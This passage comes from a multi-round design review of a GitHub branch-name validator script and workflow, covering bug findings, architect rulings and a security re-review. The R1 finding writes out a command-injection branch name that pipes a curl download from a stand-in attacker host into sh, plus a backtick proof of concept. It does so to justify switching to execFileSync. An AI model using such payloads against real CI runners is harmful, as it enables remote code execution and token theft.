  ```
  and put the while-read loop in JS. Removes one runtime dependency (sh) at the cost of one extra file.

---

### G9. **LOW** — `resolveRepoFromRemote` regex rejects trailing slash and dotted repos

**What.** Regex: `github\.com[:/]([^/]+)\/([^/.]+?)(?:\.git)?$`.
- `https://github.com/OWNER/REPO/` — trailing `/` makes `$` anchor fail → die with unhelpful error.
- `https://github.com/OWNER/REPO.name.git` — `[^/.]+?` stops at first dot → captures `REPO` instead of `REPO.name`.
- `ssh://git@github.com/OWNER/REPO.git` (note `ssh://` scheme) — matches but only because `[:/]` happens to cover the `/` after `.com`.

**Why it matters.** Current repo `mblua/AgentsCommander` has no dot and no trailing slash, so today it works. But the script is meant to be portable; a future rename to a dotted name would silently misroute the issue check. Client-side only (server uses `GITHUB_REPOSITORY` env).

**Fix.** Tighten the regex and strip a trailing slash before matching:
```js
const clean = url.replace(/\/$/, '');
const m = clean.match(/github\.com[:/](?<owner>[^/]+)\/(?<repo>.+?)(?:\.git)?$/);
```
`.+?` is still lazy but no longer rejects dots.

---

### G10. **LOW** — `git fetch origin main --depth=0` is not a valid invocation

**What.** In `.github/workflows/validate-branch-name.yml` the step `Ensure origin/main is fetched` runs:
```yaml
run: git fetch origin main --depth=0 || git fetch origin main
```
`git fetch --depth` requires a positive integer. `--depth=0` is not documented and in practice git errors out, causing the shell `||` fallback to run the plain fetch.

**Why it matters.** Cosmetic / cargo-cult: the step works only because of the fallback. It's also redundant — `actions/checkout@v4` with `fetch-depth: 0` already populates `refs/remotes/origin/main`. Keeping the step costs a second per run, but it reads as "this author didn't know the flag failed," which future maintainers will cargo-cult into new workflows.

**Fix.** Delete the step entirely. `actions/checkout@v4` with `fetch-depth: 0` is sufficient. Dev-rust E8 confirmed the same reasoning; Grinch converts "keep it, harmless" to "delete it, misleading." If the architect wants the belt-and-braces, replace with a correct invocation like `git fetch origin main --prune --no-tags`.

---

### G11. **LOW** — Top-level `await` in validator has no try/catch → unhandled rejection loses the `[branch-name]` prefix

**What.** `await verifyIssueOpen(issue);` at top level in `validate-branch-name.mjs`. Any throw inside `verifyIssueOpen` that isn't already a `die()` (e.g. DNS failure, TLS error, JSON parse error on malformed response) bubbles up to Node's default handler, which prints a stack trace and exits 1.

**Why it matters.** Every `die()` message begins with `[branch-name]` so logs are greppable and devs know where the error came from. An unhandled rejection would instead look like:
```
node:internal/process/...: Error: fetch failed
    at node:internal/...
```
Confusing. A dev reading the Actions log may not realise the branch-name validator died vs. some other Node issue.

**Fix.** Wrap top-level in try/catch:
```js
try {
  if (args.checkIssue) await verifyIssueOpen(issue);
  console.log(`[branch-name] OK: ${branch}`);
  process.exit(0);
} catch (err) {
  die(`Unexpected error: ${err?.message || err}`);
}
```

---

### G12. **LOW** — Stale green check after issue is closed post-merge-ready

**What.** Workflow only re-runs on new push. If a branch reaches green-check state, then its referenced issue is closed without any further push, the check stays green. Ruleset lets the PR merge even though semantically the issue is now closed.

**Why it matters.** Risk 4 addresses closure WHILE the branch is in flight (re-pushes fail), but not closure AFTER the last push. Low severity because it's a narrow race, but the plan advertises "must reference an OPEN issue" as a hard guarantee — this undercuts it.

**Fix.** Either accept (document as known gap) or add a `pull_request: { types: [synchronize, reopened, opened, edited] }` trigger on the workflow so the check re-runs on any PR state transition. Adds ~4 YAML lines. Architect's call — lean acceptable as "documented gap" given the project's solo-dev reality.

---

### G13. **LOW** — `WORKFLOW_PATH` string match is fragile to future renames

**What.** Grandfather detection keys on the string `.github/workflows/validate-branch-name.yml`. If the file is ever renamed (common when reorganising workflow dirs) and `WORKFLOW_PATH` is not updated in the same commit, `git cat-file -e ${mb}:${WORKFLOW_PATH}` returns false on every commit → everything "grandfathered" forever → silent total bypass.

**Why it matters.** Worst-case silent bypass of the entire enforcement system. No alarm, no visible indicator. A maintenance commit that renames a file would look clean in review.

**Fix.**
- Adopting G1's pinned cutoff SHA approach removes this class of bug entirely (no file-path lookup).
- If staying with the file-exists approach, add a hard fail in the workflow: `cat .github/workflows/validate-branch-name.yml >/dev/null || exit 1` as a preflight step to confirm the constant matches reality.

---

### G14. **INFO** — No unit tests for the validator

Not blocking. But the script has ≥8 code paths (exempt ✓, grandfather ✓, format fail, format pass, issue open, issue closed, issue missing, auth missing, repo-parse fail, rate-limit). Zero tests. A tiny node-native test file (`node --test scripts/validate-branch-name.test.mjs`) calling the script via `execFileSync` with different args would lock behaviour and document each path. Worth considering as a follow-up issue, not a blocker for this plan.

---

### Summary

| Sev | Count | Items |
|---|---|---|
| HIGH | 3 | G1, G2, G3 |
| MEDIUM | 5 | G4, G5, G6, G7, G8 |
| LOW | 5 | G9, G10, G11, G12, G13 |
| INFO | 1 | G14 |

**Recommendation to tech-lead.** G1+G2+G3 are interlocking — fixing all three (pinned cutoff + fail-closed on shOk errors + mandatory up-to-date) closes the primary bypass. Without at least one of them, the system is bypassable in one command by anyone with write access. Do not merge before G1+G3 (G2 tightening is cheap enough to bundle). Medium items G4, G5, G6 are small diffs worth folding in now. G7, G8, G9–G14 can ship as follow-ups if pressed for time, but G8 should at minimum be documented.

---

## Open questions

Everything in the locked-decisions list is addressed. Raising two net-new questions for the architect to rule on. Not blocking implementation — can implement without answers and revisit.

1. **Forked-PR / external-contributor flow** — the workflow is `on: push` with `branches-ignore`. A PR opened from a **fork** does not trigger `push` events in the upstream repo, so no `validate-branch-name` check is ever published for that PR. The Ruleset's required-check gate would then block the PR forever. Locked decisions do not mention forks, and the project's current reality is a single-owner repo with no fork PRs. Two options:
   - **(a)** Accept the gap. Forked PRs are a non-goal right now; revisit if/when an external contributor files one.
   - **(b)** Add `pull_request: { branches: [main] }` to the workflow trigger and switch `GITHUB_REF_NAME` to `github.head_ref` inside the job (pr triggers expose `refs/pull/N/merge` as `ref_name`). This would require a tiny if/else in the workflow to pick the right ref env var. Adds ~6 yaml lines.

   **Recommendation (dev-rust)**: go with **(a)** for now, track as a separate issue if a fork contribution ever appears. Implementing now is speculative and adds surface area.

2. **Slug cap of 50 chars** — locked at 50 per plan's table. Plan also says "If that proves too tight in practice, bump `MAX_SLUG` in one place." I don't think it's too tight, but worth confirming architect picked 50 deliberately vs. a round number. If deliberate, nothing to do. No blocker either way.

3. **(Grinch) Grandfather semantic — cutoff SHA vs. workflow-file presence?** See G1/G2/G13. The plan's "file absent at merge-base" approach has (i) a one-command bypass via branching from a pre-cutoff commit, (ii) silent total bypass if the workflow file is ever renamed without updating `WORKFLOW_PATH`, (iii) coupling of enforcement logic to a path string. A pinned-cutoff-SHA approach (committed `scripts/branch-name-enforcement.cutoff` or a git tag) removes all three. Cost: one extra file and one post-merge manual step (record the SHA). Architect to rule: keep the elegant "sentinel file" approach (accepting the bypass mitigated by mandatory up-to-date Ruleset rule), or switch to pinned SHA?

4. **(Grinch) Mandatory up-to-date Ruleset rule — enforce, or leave as recommended?** See G3. If the architect keeps the current grandfather approach, "Require branches to be up to date before merging" must become MANDATORY. If switching to a pinned cutoff SHA (Q3(b)), it is merely best practice. Architect ruling ties this to Q3.

5. **(Grinch) Deletion-event guard on the workflow — add `if: github.event.deleted != true`?** See G4. Currently every `git push origin --delete <branch>` on a non-exempt branch spawns a failed workflow run and may flip a PR's required status check from green to red. Guard is a 1-line addition. Recommend YES unless architect has a reason to keep deletion events running.

---

## Architect round 2 resolution

Ruling on every finding from dev-rust (E1–E8) and grinch (G1–G14), plus the five Open Questions. Summary table first, detail below.

| ID | Sev | Disposition | Where in plan |
|---|---|---|---|
| E1 | req | **Adopted** | New section 5 `.gitattributes`, Files-to-create table row |
| E2 | req | **Adopted** | Implementation order step 6 (`git update-index --chmod=+x`) |
| E3 | rec | **Adopted** | Implementation order step 5 (commit `package-lock.json`) |
| E4 | opt | **Rejected** | Current hook loop is correct; no extra guard |
| E5 | req | **Adopted** | Ruleset recipe, "Add checks" row note |
| E6(a) | rec | **Accepted** (no change) | shOk behavior is intentional per G2 fail-CLOSED |
| E6(b) | rec | **Accepted** (no change) | regex moot after G7 removes remote parser |
| E6(c) | rec | **Accepted** (no change) | Upstream `main` is fixed; fork fallback not a goal |
| E6(d) | rec | **Adopted** | `verifyIssueOpen` 404 message rewritten |
| E6(e) | rec | **Adopted** (also G6) | `AbortSignal.timeout(10_000)` + error handling |
| E7 | info | Informational | No change |
| E8 | info | **Adopted as cleanup** (also G10) | Redundant fetch step deleted |
| G1 | HIGH | **Adopted** | Full rewrite: pinned cutoff SHA in `.github/branch-name-enforcement.cutoff.sha`; validator switched to `git merge-base --is-ancestor <cutoff> <branch>` |
| G2 | HIGH | **Adopted** | `isGrandfathered` fails CLOSED on every git probe (missing cutoff file, malformed SHA, cutoff object absent, branch unresolvable) |
| G3 | HIGH | **Adopted** | Ruleset recipe: "Require branches to be up to date" now **MANDATORY** (bold row, explicit "do not disable" note, duplicated in CONTRIBUTING.md) |
| G4 | MED | **Adopted** | Workflow `if:` guard skipping deletion pushes |
| G5 | MED | **Adopted** | Workflow `concurrency:` group + `cancel-in-progress: true` |
| G6 | MED | **Adopted** (consensus with E6e) | `AbortSignal.timeout(10_000)` |
| G7 | MED | **Adopted** | `TARGET_REPO = 'mblua/AgentsCommander'` hardcoded; `resolveRepoFromRemote` removed |
| G8 | MED | **Adopted as doc** | CONTRIBUTING.md "Windows tooling note" section |
| G9 | LOW | **Moot** (after G7) | `resolveRepoFromRemote` deleted |
| G10 | LOW | **Adopted** (also E8) | Redundant `git fetch origin main --depth=0` step deleted |
| G11 | LOW | **Adopted** | Top-level `try { … } catch { die(...) }` wrapper |
| G12 | LOW | **Accepted as gap** | Documented in Risks section 12. Not worth a `pull_request` trigger's fork-PR expansion |
| G13 | LOW | **Moot** (after G1) | SHA-pinned scheme no longer depends on workflow file path |
| G14 | INFO | **Deferred** | Unit tests tracked for a follow-up issue; not a blocker |
| Q1 | — | Accept the gap (fork PRs non-goal) | Risks section 14 |
| Q2 | — | 50-char cap is deliberate | No change |
| Q3 | — | Pinned cutoff SHA (grinch's fix) | See G1 |
| Q4 | — | Mandatory up-to-date rule | See G3 |
| Q5 | — | Deletion guard enabled | See G4 |

### Resolution detail

#### HIGH — G1, G2, G3 (interlocked, all three adopted)

The grandfather scheme moves from "workflow file absent at merge-base" to "pinned cutoff SHA not in branch ancestry." Concretely:

- New file `.github/branch-name-enforcement.cutoff.sha` is committed with placeholder `PENDING`. Post-merge, the owner overwrites it with the merge-commit SHA (Implementation order step 11).
- `isGrandfathered` in the validator reads the file from `origin/main` (not from the working tree — the working tree may be a feature branch that hasn't seen the file yet). If the file contents don't match `^[0-9a-f]{40}$`, return false → enforce. If the cutoff object is unknown locally, return false → enforce. If branch ref unresolvable, return false → enforce. Only when the cutoff is a valid commit AND `--is-ancestor` confirms it's NOT in the branch's history does grandfather apply.
- The Ruleset "Require branches to be up to date before merging" is promoted from the informational "Recommended" note to **MANDATORY**. The recipe row is bolded, the Notes column carries a "do NOT disable" caveat, and CONTRIBUTING.md repeats the warning under "Maintainer note". Together with G1, this closes the "branch from pre-cutoff commit" bypass: the rule forces the PR to ingest current main, which puts the cutoff SHA into ancestry, which triggers enforcement on the next workflow run.

G2's fail-CLOSED discipline is pervasive: every `shOk(...)` in the grandfather path is followed by `return false` on failure. No more "swallow error → grandfather" path.

#### MED — G4 (deletion guard)

Workflow job gains `if: github.event.deleted != true && github.event.after != '0000000000000000000000000000000000000000'`. Double belt: `deleted` field is the documented signal; `after` zero-SHA is the raw payload form. Either true → skip. Safer than relying on a single field across GitHub's push event schema.

#### MED — G5 (concurrency)

Top-level:
```yaml
concurrency:
  group: validate-branch-name-${{ github.ref }}
  cancel-in-progress: true
```
Force-push iterations no longer accumulate runs.

#### MED — G6 (API timeout) ⇆ E6(e) consensus

`AbortSignal.timeout(10_000)` in `verifyIssueOpen`. Explicit handling of `TimeoutError` and `AbortError` so the message prefix remains `[branch-name]` and the exit code is 1.

#### MED — G7 (fork-triggered runs)

`TARGET_REPO` hardcoded at the top of the validator. `resolveRepoFromRemote` and `GITHUB_REPOSITORY` reads deleted. Fork-originated workflow runs now hit the upstream issue API deterministically — either succeed (public upstream issue, any token) or fail loud (private upstream, fork token cannot access). No silent cross-repo false positives.

#### MED — G8 (Windows/sh availability)

`CONTRIBUTING.md` gains a "Windows tooling note" under the pre-push hook section: Git for Windows required; confirm with `sh --version`. Not switching to Node-only hook — adds complexity, and the owner is already on Git Bash.

#### LOW — G9 (remote-URL regex)

Moot: the regex is in `resolveRepoFromRemote`, which is deleted after G7.

#### LOW — G10 (invalid `--depth=0`) ⇆ E8

Step deleted. `actions/checkout@v4` with `fetch-depth: 0` is sufficient for the ancestor check.

#### LOW — G11 (top-level await)

Main wrapped in `(async () => { try { … } catch (err) { die(`Unexpected error: ${err?.message || err}`); } })();`. Every failure now prefixes with `[branch-name]` — no raw stack traces leaking into Actions logs.

#### LOW — G12 (stale green check after post-ready issue close)

Accepted as a documented gap (Risks 12). The workflow is `on: push` only; adding `on: pull_request` would expand to fork-PR runs and tangle with the Q1 non-goal. Lean-acceptable given the solo-dev reality. If this race ever bites in practice, file a follow-up issue to add `pull_request: { types: [opened, synchronize, reopened] }` and filter for same-repo PRs.

#### LOW — G13 (workflow-path fragility)

Moot after G1: the scheme no longer keys on a workflow-file path. The cutoff file path (`CUTOFF_SHA_PATH`) is now the only path the validator cares about, and a rename of that file without updating the constant fails CLOSED (every PR rejected with a visible error) — self-alarming, not silent.

#### INFO — G14 (no unit tests)

Deferred. Not blocking. Track as follow-up if/when a regression ships.

#### E1–E8 (dev-rust enrichments)

- **E1 (`.gitattributes`)**: adopted. New file, added to Files-to-create table and Files Summary.
- **E2 (executable bit)**: adopted. Implementation order step 6 gains the `git update-index --add --chmod=+x .husky/pre-push` line with verification.
- **E3 (commit lockfile)**: adopted. Implementation order step 5 explicitly mentions committing `package-lock.json` alongside `package.json`.
- **E4 (stdin guard)**: rejected. Current `while read …` loop with `exit 0` post-loop correctly handles zero-ref push. Extra guard is churn.
- **E5 (copy-paste check name)**: adopted. Ruleset recipe "Add checks" row gains a one-line note about copying the exact check string from a real run.
- **E6(a-e)**: (a)/(b)/(c) are no-op notes; (d) rewords the 404 message ("not accessible in ..."); (e) is the timeout, merged with G6.
- **E7 (self-push behavior)**: informational. Bootstrap path is already explicit in Risks 8 and Implementation order steps 7-8.
- **E8 (redundant fetch step)**: adopted. Agrees with G10; deletion implemented.

#### Open Questions

1. **Forked-PR flow**: accept the gap. Non-goal per locked decisions. Track as a separate issue if a fork contribution is ever filed.
2. **Slug cap of 50**: deliberate. 50 chars fits 8-10 kebab-case words, total branch length stays under ~65 chars for terminal/GitHub ergonomics. If experience proves too tight, bump `MAX_SLUG` in one place — no cascading edits.
3. **Grandfather semantic**: SHA-pinned (grinch's preferred fix). See G1 resolution.
4. **Mandatory up-to-date rule**: required. See G3 resolution.
5. **Deletion-event guard**: yes. See G4 resolution.

Nothing is flagged for tech-lead escalation. All rulings are technical and documented.

---

## Architect round 3 resolution

Round-3 review: dev-rust approved with minor notes (R1 pedagogical, R2/R3 trivial); grinch BLOCKED on R1 with empirical command-injection PoC on `ubuntu-latest`. Both converge on the same fix (`execFileSync` argv migration) — disagreement is only on severity labelling. Adopting R1 closes the finding and ships. Rule-of-round-3 does not need to be invoked — there is no minority.

| ID | Sev | Disposition | Where in plan |
|---|---|---|---|
| R1 | HIGH (grinch) / MED (dev-rust) | **Adopted** | Validator section 1: `sh`/`shOk` replaced with `git`/`gitOk` using `execFileSync('git', argv, opts)`. Import switched to `execFileSync`. Every call site in `resolveBranch`, `readCutoffSha`, `isGrandfathered` updated. Notes block gains an explicit "No shell is ever spawned" bullet with the PoC payload. |
| R2 | LOW | **Adopted** | Validator: new `SHA_RE = /^[0-9a-fA-F]{40}$/` constant; `readCutoffSha` uses `SHA_RE.test(first)`. Cutoff-file section updated to cite case-insensitive regex. |
| R3 | LOW | **Adopted** | Implementation order step 10 captures `MERGE_SHA` immediately after `git merge --no-ff`, before any ref-moving command. Step 11 reuses `$MERGE_SHA` directly — no second `git rev-parse HEAD`. Includes a sanity-print and a remote-side verification with `git show origin/main:...`. |
| R4 | INFO | **No change** | Informational only (dev-rust). |

### Resolution detail

#### R1 — command injection in `isGrandfathered` (HIGH, grinch's PoC verified)

**Threat model**: A git ref name may legally contain `` ` ``, `$(…)`, `;`, `&`, `|`, `<`, `>`, and whitespace. `git check-ref-format` only forbids a narrow set (control chars, `~^:?*[\`, leading `.`, `..`, trailing `/`, trailing `.`, trailing `.lock`, backslash, `@{`). An attacker with write access can push a branch named e.g.:

```
feature/63-pwn`touch /tmp/pwn`
```

Round-2 validator sent that string into `execSync` as part of a templated command string:

```js
shOk(`git rev-parse --verify "${branch}"`)
```

`execSync` spawns a shell; the shell expands the backticks and executes `touch /tmp/pwn` on every pre-push hook run and every CI run of the workflow.

**Fix**: The argv form (`execFileSync('git', args, opts)`) bypasses the shell entirely. Node hands `argv` to the kernel's `execve` directly; metacharacters in `argv[n]` are just bytes to git, which returns a non-zero exit for unresolvable refs → fail CLOSED → format check fires → branch rejected with a visible error. No shell context anywhere in the script.

**Code change** — complete new helper pair replacing `sh` / `shOk`:

```js
import { execFileSync } from 'node:child_process';

function git(args) {
  return execFileSync('git', args, {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'ignore'],
  }).trim();
}
function gitOk(args) {
  try { execFileSync('git', args, { stdio: 'ignore' }); return true; }
  catch { return false; }
}
```

**Call sites updated** (all now shell-free):

| Call site | Before (round 2) | After (round 3) |
|---|---|---|
| `resolveBranch` | `sh('git symbolic-ref --short HEAD')` | `git(['symbolic-ref', '--short', 'HEAD'])` |
| `readCutoffSha` | `` sh(`git show origin/main:${CUTOFF_SHA_PATH}`) `` | `` git(['show', `origin/main:${CUTOFF_SHA_PATH}`]) `` |
| `isGrandfathered` cutoff-obj probe | `` shOk(`git rev-parse --verify ${cutoff}^{commit}`) `` | `` gitOk(['rev-parse', '--verify', `${cutoff}^{commit}`]) `` |
| `isGrandfathered` branch probe | `` shOk(`git rev-parse --verify "${branch}"`) `` | `gitOk(['rev-parse', '--verify', branch])` |
| `isGrandfathered` ancestor test | `` shOk(`git merge-base --is-ancestor ${cutoff} "${branch}"`) `` | `gitOk(['merge-base', '--is-ancestor', cutoff, branch])` |

Total delta inside the validator: `sh` and `shOk` are fully replaced; every git invocation in the script routes through `git` / `gitOk`. There are no remaining `execSync` calls after this change.

#### R2 — case-insensitive SHA regex (LOW)

Git SHAs are conventionally lowercase but `git rev-parse` accepts mixed-case input, and some tools (including a few GUIs and the `GITHUB_SHA` env var in specific contexts) emit uppercase. Accepting both avoids a silent fail-CLOSED if anything upstream serialises the SHA uppercase.

**Code change**: new top-level constant `const SHA_RE = /^[0-9a-fA-F]{40}$/;` and `readCutoffSha` uses `SHA_RE.test(first)` in place of the literal lowercase-only regex. The cutoff-SHA section of the plan is updated to cite `^[0-9a-fA-F]{40}$`.

#### R3 — capture MERGE_SHA at merge time (LOW)

The round-2 flow re-read `HEAD` in step 11 after a `git pull --ff-only origin main`. If the remote `main` had advanced between the local merge and the pull (e.g. the owner's other machine had pushed), `HEAD` after the pull would be a newer commit and the cutoff SHA would point at the wrong enforcement anchor.

**Fix**: step 10 captures `MERGE_SHA` immediately after `git merge --no-ff`, before any ref-moving command. Step 11 uses the captured `$MERGE_SHA` directly. Shell output of the captured value is included as a sanity-print so the owner visually confirms a 40-char hex SHA before committing. A remote-side verification (`git show origin/main:.github/branch-name-enforcement.cutoff.sha`) closes the loop.

See the updated Implementation order steps 10-11.

### Regressions checked

- **Cross-platform `execFileSync('git', ...)`**: works identically on Linux (CI), macOS, and Windows (Git for Windows provides `git.exe` on PATH; Node spawns it directly without cmd.exe). No `.exe` suffix needed — Node resolves PATHEXT on Windows automatically.
- **Error semantics**: `execFileSync` throws on non-zero exit exactly like `execSync` did. `gitOk` catches the throw. Behavior identical for the fail-CLOSED discipline.
- **stderr visibility**: both helpers pass `stdio: ['ignore', 'pipe', 'ignore']` or `'ignore'` → git's stderr is still suppressed for intentional probes. `die()` messages continue to be the only error surface.
- **Call-site count**: the round-3 diff touches exactly five `sh`/`shOk` call sites plus the helper definitions. No other functions needed updates.

### CONSENSUS

Dev-rust + grinch converge on `execFileSync`. R2 and R3 are trivial low-severity tightening. No open disagreement. Plan ready to ship.

---

## Grinch round 2 review

Round-2 design pass. Validated architect resolutions G1+G2+G3 against multiple attack scenarios (pre-cutoff branching, cherry-pick cutoff commit, force-push rebases, cutoff file tampering via PR, fresh-clone races, bootstrap window). **The interlock holds.** Summary of what was tested and what survives:

### Verified closed

- **G1 (grandfather bypass via pre-cutoff branching).** Reproduced the round-1 attack mentally against round-2 design: attacker cuts branch from pre-cutoff commit B, commits bad-name work, pushes. Cutoff SHA C is NOT in branch ancestry → grandfather=true → workflow green. Attacker opens PR. Ruleset "Require branches to be up to date before merging" (now MANDATORY) blocks merge until branch has current main tip in ancestry. Rebase onto current main injects C → grandfather=false → next push re-runs validation → format check rejects bad name. **Closed.** The interlock with G3 is load-bearing; removing either breaks it.
- **G2 (fail-OPEN on transient git errors).** `isGrandfathered` now explicitly returns `false` on every shOk failure (missing cutoff file, malformed SHA content, unknown cutoff object, unresolvable branch, non-ancestor probe failure). **Closed.** Transient git hiccups now over-enforce rather than silently skip.
- **G3 (Recommended → Mandatory).** Ruleset recipe row is bolded, Notes column carries "do NOT disable", CONTRIBUTING.md has a `Maintainer note` stating the same. **Closed.** Hard to miss or silently relax.
- **G7/G4/G5/G6/G10/G11.** All spot-checked against the rewritten files. `TARGET_REPO` hardcoded; `if: github.event.deleted != true && github.event.after != '0000...'` belt-and-braces; `concurrency: cancel-in-progress: true`; `AbortSignal.timeout(10_000)`; broken `--depth=0` fetch deleted; top-level `(async()=>{try{...}catch{die(...)}})()` wrapper in place. **All closed.**
- **G13 (workflow-path fragility).** Moot under SHA-pinned scheme. Renaming `CUTOFF_SHA_PATH` without updating the constant fails CLOSED (every PR rejected with a visible format error) — self-alarming, not silent. **Closed.**

### Cherry-pick / tampering side-channels (confirmed no bypass)

- **Cherry-picking cutoff commit C into a pre-cutoff branch** does NOT put C into the ancestry (cherry-pick creates a new commit with a different SHA). `--is-ancestor` returns false → grandfather=true. But the Ruleset "up-to-date" rule compares the branch to main's tip (C') by direct ancestor, not by patch-id — cherry-picked copy is not the real commit → not up-to-date → merge blocked. Attack fails.
- **Tampering with cutoff file via PR** (rewriting to a pre-cutoff SHA, a future SHA, or a non-existent SHA) — validator regex guarantees `^[0-9a-f]{40}$`, then validates with `git rev-parse --verify <sha>^{commit}`. Unknown objects → fail-CLOSED → enforce. A PR changing the file to an earlier SHA merely widens enforcement (benign). Changing to a non-existent SHA → everything fails-closed (benign). **No path to bypass.**
- **Force-pushing main to drop cutoff commit C** — owner action, trusted, out of threat model. Runners that fetched post-rewrite fail to resolve C → enforce. Benign.

### New findings

---

### R1. **HIGH — blocking** — Command injection via branch name into `isGrandfathered` shell calls

**What.** `scripts/validate-branch-name.mjs` (round-2 rewrite, lines 199–200):
```js
if (!shOk(`git rev-parse --verify "${branch}"`)) return false;
if (shOk(`git merge-base --is-ancestor ${cutoff} "${branch}"`)) return false;
```
`shOk` is `execSync(cmd, { stdio: 'ignore' })`. Node's `execSync` spawns a shell by default (`/bin/sh -c` on Linux runners, `cmd.exe /d /s /c` on Windows). The template literal interpolates `${branch}` directly into the command string; the value is then re-parsed by the shell. On `ubuntu-latest`, `sh` is POSIX `dash` (or bash) — both perform **command substitution inside double-quoted strings**.

Git ref-format rules permit `$`, `(`, `)`, `` ` ``, `&`, `|`, `;`, `<`, `>`, `"`, `'` in branch names. Confirmed empirically: `git check-ref-format --branch 'feature/63-foo$(id)'` accepts the name. Any contributor with write access can push:
```
feature/63-foo$(curl -sSf https://attacker.example/x | sh)
```
and the workflow's first shOk line expands the substitution before `git rev-parse` sees the argument. The injected code runs on the runner with:
- `GH_TOKEN` / `GITHUB_TOKEN` in env (exfiltratable)
- `permissions: contents: read, issues: read` (read-only scope, but includes private issues if repo is private)
- full network egress
- access to the runner's working directory and `/tmp`

Proof of concept under WSL:
```
$ bash -c 'echo "feature/63-foo$(touch /tmp/pwn && echo INJECTED)"'
feature/63-fooINJECTED
$ ls /tmp/pwn
/tmp/pwn
```

Confirmed both under `/usr/bin/bash` and `/usr/bin/sh` (dash). `ubuntu-latest` runners are vulnerable.

**Why it matters.** A single compromised or malicious contributor (someone with push rights, which is a trust prerequisite but NOT a sufficient-to-trust condition — e.g. a new team member, or a maintainer's account briefly compromised) gets arbitrary code execution on GitHub's runner under the repo's GITHUB_TOKEN. Worse than a branch-name bypass: this is runner RCE inside a workflow the project trusts. The scope is limited by the workflow's `permissions:` block, but the token can still read private issues and the exfiltration path (egress) is fully open. This attack surface exists for every push to a non-exempt branch.

This finding is not round-2-specific — the round-1 `isGrandfathered` also had `git merge-base origin/main "${branch}"` and `git cat-file -e ${mb}:${WORKFLOW_PATH}` (the latter constant-only). Round 2 adds TWO new interpolation sites (`rev-parse --verify "${branch}"` and `merge-base --is-ancestor ... "${branch}"`), doubling the surface. Grinch missed this in round 1; surfacing now.

**Fix.** Switch every `execSync(command_string)` that interpolates user input to `execFileSync(file, argsArray)`. `execFileSync` does NOT spawn a shell — it invokes the binary directly with an argv vector, so no shell parsing, no substitution, no injection. Concrete diff:

```js
import { execSync, execFileSync } from 'node:child_process';

// NEW helpers — no shell, argv-array
function gitOk(args) {
  try { execFileSync('git', args, { stdio: 'ignore' }); return true; } catch { return false; }
}
function git(args) {
  return execFileSync('git', args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'ignore'] }).trim();
}

// Apply throughout isGrandfathered / readCutoffSha / resolveBranch:
function readCutoffSha() {
  let content;
  try { content = git(['show', `origin/main:${CUTOFF_SHA_PATH}`]); }
  catch { return null; }
  const first = content.split('\n', 1)[0].trim();
  if (!/^[0-9a-f]{40}$/.test(first)) return null;
  return first;
}

function isGrandfathered(branch) {
  const cutoff = readCutoffSha();
  if (!cutoff) return false;
  if (!gitOk(['rev-parse', '--verify', `${cutoff}^{commit}`])) return false;
  if (!gitOk(['rev-parse', '--verify', branch])) return false;
  if (gitOk(['merge-base', '--is-ancestor', cutoff, branch])) return false;
  return true;
}

function resolveBranch() {
  if (process.env.GITHUB_REF_NAME) return process.env.GITHUB_REF_NAME;
  try { return git(['symbolic-ref', '--short', 'HEAD']); }
  catch { die('Could not resolve current branch (detached HEAD?). Pass --branch <name>.'); }
}
```

`cutoff` is constrained by regex to hex-only, and paths (`origin/main:${CUTOFF_SHA_PATH}`) are composed of constants, so neither needs further sanitization. `branch` can be whatever git accepts — which includes shell-active chars — but with `execFile` the shell never sees them. This eliminates R1 entirely.

This change is 3–5 lines of diff per helper plus a one-line import. No behavior change for valid inputs. Strongly recommend bundling into round-2 before merge, not deferring.

---

### R2. **LOW** — Cutoff-SHA regex rejects uppercase hex (owner foot-gun only)

**What.** `readCutoffSha` validates content with `/^[0-9a-f]{40}$/` (case-sensitive). Git's SHA output is lowercase by default, so this is fine in the happy path. But an owner who manually types or pastes an uppercase SHA into the cutoff file (e.g. copying from a GitHub URL that surfaces uppercase in some tools) breaks enforcement: regex fails → `null` → fail-CLOSED → every PR gets rejected.

**Why it matters.** Self-alarming — the owner notices immediately because PRs start failing — so the blast radius is small. But it's a 30-second confusing debugging session when it happens. One `.toLowerCase()` saves the day.

**Fix.** Either broaden to `/^[0-9a-fA-F]{40}$/` and lowercase in the script (`return first.toLowerCase();`), or add a one-line check in step 11 of the Implementation order: `grep -qE '^[0-9a-f]{40}$' .github/branch-name-enforcement.cutoff.sha || echo "BAD"`. Tiny hardening.

---

### R3. **LOW** — Step 11 `MERGE_SHA=$(git rev-parse HEAD)` assumes HEAD is the merge commit

**What.** Plan step 11:
```bash
git checkout main
git pull --ff-only origin main
MERGE_SHA=$(git rev-parse HEAD)
```
After `git pull --ff-only origin main`, HEAD is `origin/main`'s tip, which is the enforcement merge commit from step 10 — iff the owner did NOT commit anything else in between. If the owner accidentally pulled with `--rebase` or created an intermediate commit on main between step 10 and step 11, `HEAD` is NOT the merge commit, and the cutoff SHA recorded is wrong.

**Why it matters.** Low because the owner is a single trusted human following a written recipe, but the "whatever HEAD happens to be" phrasing is fragile. A more explicit formula — pointing directly at the merge commit — removes the ambiguity.

**Fix.** Explicitly capture the merge commit immediately in step 10 (before any further main-side activity):
```bash
# End of step 10 (owner local-merge)
git merge --no-ff feature/63-branch-name-enforcement    # or however step 10 actually merges
MERGE_SHA=$(git rev-parse HEAD)                         # capture NOW
git push origin main
# → carry MERGE_SHA into step 11 explicitly
```
Or in step 11, verify the captured SHA is the merge commit:
```bash
MERGE_SHA=$(git log --merges --format=%H HEAD^..HEAD | head -1)
test -n "$MERGE_SHA" || { echo "no merge commit at HEAD"; exit 1; }
```
Either formulation is more robust than `git rev-parse HEAD` alone.

---

### R4. **INFO** — `readCutoffSha` trusts whatever `origin/main` points to locally

**What.** On CI, `actions/checkout@v4` with `fetch-depth: 0` refreshes `origin/main` to upstream's current tip — authoritative. On a dev's machine, `origin/main` reflects whatever they last fetched. If a dev never `git fetch`es between the enforcement merge and their next push, their local `origin/main` is stale, and the hook reads an old/absent cutoff → `null` → fail-CLOSED → format check runs. Friction, not bypass.

**Why it matters.** Not a security issue; just a UX detail. Documented as-is in the plan's "Edge cases" block ("Local hook without origin/main fetched"). No action needed. Flagging for transparency that the behavior is correct.

---

### Summary — round 2

| Sev | Count | IDs |
|---|---|---|
| HIGH | 1 | R1 (command injection) |
| MEDIUM | 0 | — |
| LOW | 2 | R2, R3 |
| INFO | 1 | R4 |

